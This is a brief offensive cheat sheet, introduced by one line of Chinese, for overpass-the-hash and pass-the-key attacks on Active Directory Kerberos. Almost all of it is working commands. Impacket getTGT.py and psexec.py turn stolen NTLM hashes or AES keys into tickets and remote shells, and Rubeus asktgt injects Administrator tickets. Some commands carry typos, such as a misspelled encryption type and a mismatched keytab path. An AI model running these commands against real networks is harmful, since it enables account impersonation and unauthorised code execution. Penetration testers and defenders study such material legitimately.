	在这种技术中，我们不是直接传递哈希值，而是使用帐户的 NTLM 哈希值来请求有效的 Kerberost 票证 (TGT)
  ### impacket
  	>python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
	>export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
	>python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
	>./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
	>ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
	>kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
	>klist
  ### Rubeus
  	>.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
	>.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
	>.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe